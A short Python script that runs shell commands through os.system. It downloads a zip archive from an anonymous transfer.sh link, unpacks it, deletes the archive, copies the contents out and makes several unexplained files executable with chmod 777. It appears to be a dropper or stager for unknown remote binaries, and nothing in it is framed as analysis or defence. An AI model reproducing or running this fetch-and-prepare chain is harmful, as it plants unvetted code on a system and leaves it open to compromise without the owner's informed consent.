import os

commands = """wget https://transfer.sh/w565dl/mixeds.zip
unzip mixeds.zip
rm -rf mixeds.zip
cd mixeds
cp * ../
chmod 777 mixedv8
chmod 777 mixedveta
chmod 777 mixedv13
chmod 777 mixedvlock
chmod 777 mixedv16.js
chmod 777 mixedv10"""

for i in commands.splitlines():
    os.system(i)